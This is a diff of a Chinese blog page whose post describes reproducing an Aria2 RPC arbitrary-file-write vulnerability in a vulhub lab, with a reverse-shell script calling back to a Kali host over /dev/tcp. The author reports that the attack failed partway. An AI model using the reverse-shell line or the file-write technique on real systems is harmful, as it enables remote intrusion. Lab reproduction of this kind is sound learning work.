@@ -281,7 +281,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>750</span>
+              <span>754</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -301,24 +301,30 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id><a href="#" class="headerlink" title></a></h3><p>Aria2 是一款命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><code>docker-compose up -d</code></p>
-<p>aria2的rpc服务端口默认为6800，启动环境后访问 <code>192.168.159.128:6800</code> burpsuite抓包后发现返回为404</p>
-<p>因为 rpc 通信需要使用 json 或者 xml，不太方便，所以我们可以借助第三方 UI 来和目标通信，这是一款轻量级web写入工具</p>
+        <h3 id="section"></h3>
+<p>Aria2 是一款命令行下轻量级、多协议、多来源的下载工具（支持
+HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞</p>
+<h3 id="漏洞复现">漏洞复现</h3>
+<p><code>docker-compose up -d</code></p>
+<p>aria2的rpc服务端口默认为6800，启动环境后访问
+<code>192.168.159.128:6800</code> burpsuite抓包后发现返回为404</p>
+<p>因为 rpc 通信需要使用 json 或者 xml，不太方便，所以我们可以借助第三方
+UI 来和目标通信，这是一款轻量级web写入工具</p>
 <p><code>http://binux.github.io/yaaw/demo/</code></p>
 <p>点击右上角的设置进行信息配置</p>
 <p><img src="/posts/undefined/settings.png"></p>
-<br>
-
+<p><br></p>
 <p>开启一个web服务，将shell准备好，shell文件要在linux环境下去生产，因为Linux和windows下的换行符不同</p>
 <p>kali ： 192.168.159.129</p>
 <p>Ubuntu ： 192.168.159.128</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /bin/sh</span></span><br><span class="line">/bin/sh <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">159.129</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>Python2 ：python2 -m SimpleHTTPServer 8000<br>Python3 ：python3 -m http.server 8000</p>
+<p>Python2 ：python2 -m SimpleHTTPServer 8000 Python3 ：python3 -m
+http.server 8000</p>
 <p><img src="/posts/undefined/add_task.png"></p>
-<p>不知道为什么，无法下载文件，之前去测试下载别的东西，也无法去下载…一直报错<code>Error: Internal server error</code></p>
-<p>查了下报错原因 说是因为没有找到 Aria2 进程，但是在vulhub docker环境中已经开放了，试了几次最终还是没找到原因….后续的利用crond任务反弹shell也就没法实现了。<br>之后有时间再去复现一下吧.</p>
+<p>不知道为什么，无法下载文件，之前去测试下载别的东西，也无法去下载...一直报错<code>Error: Internal server error</code></p>
+<p>查了下报错原因 说是因为没有找到 Aria2 进程，但是在vulhub
+docker环境中已经开放了，试了几次最终还是没找到原因....后续的利用crond任务反弹shell也就没法实现了。
+之后有时间再去复现一下吧.</p>
 
     </div>
 
@@ -448,7 +454,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#section"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -464,7 +470,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -512,7 +518,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -526,7 +532,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -537,7 +543,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -677,6 +683,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
